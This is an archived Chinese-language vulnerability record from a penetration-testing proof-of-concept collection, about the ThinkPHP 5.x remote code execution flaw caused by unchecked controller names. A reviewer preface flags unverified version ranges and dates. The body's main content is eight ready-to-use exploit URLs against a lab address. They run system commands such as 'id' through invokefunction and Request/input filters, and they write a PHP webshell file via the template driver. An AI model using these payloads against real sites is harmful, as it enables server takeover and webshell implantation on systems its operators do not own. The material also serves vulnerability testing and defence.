---
source: "Mr-xn/Penetration_Testing_POC"
product: "ThinkPHP / 控制器反射"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "thinkphp5框架缺陷导致远程代码执行"
prerequisites: "来源所述条件，未列明部分仍待核：5.x<5.1.31、<=5.0.23待边界核验；未强制路由"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-374ab054e49e1a4815de71d0"
entity_id: "ve-0f617e8adb55104edd6d623c"
schema_version: "1"
canonical: "Web安全/开发框架/ThinkPHP/Thinkphp 5.1.(-31)&5.0.(-23)远程代码执行.md"
relation_type: "duplicate_of"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：5.x&lt;5.1.31、&lt;=5.0.23待边界核验；未强制路由

代码与实验材料：八条URL与548完全相同，无实验响应

来源证据范围：Mr-xn归档与微信详情

- **事实待核（1）**：影响范围/日期需更正；依据：同548：5.0.23上限与修复资料冲突，上报2018-10-10缺依据。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **事实待核（2）**：CVE字段并非编号；依据：列中放微信链接，不能当CVE。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **事实待核（3）**：未映射各载荷兼容性；依据：Request、App、Container、File、Php方法不是跨版本均等可用。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# thinkphp5框架缺陷导致远程代码执行

### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|thinkphp5框架缺陷导致远程代码执行|2018-10-10|unknown|[http://www.thinkphp.cn/](http://www.thinkphp.cn/) | [下载连接](http://www.thinkphp.cn/down.html) |5.x < 5.1.31, <= 5.0.23| [详情](https://mp.weixin.qq.com/s/oWzDIIjJS2cwjb4rzOM4DQ)|  

#### 漏洞概述  

> 由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞   
> 
### poc

```html
http://192.168.99.98:7878/?s=index/\think\Request/input&filter=phpinfo&data=1
http://192.168.99.98:7878/?s=index/\think\Request/input&filter=system&data=id
http://192.168.99.98:7878/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E
http://192.168.99.98:7878/?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E
http://192.168.99.98:7878/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
http://192.168.99.98:7878/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
http://192.168.99.98:7878/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
http://192.168.99.98:7878/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```


---

> 来源：Mr-xn/Penetration_Testing_POC
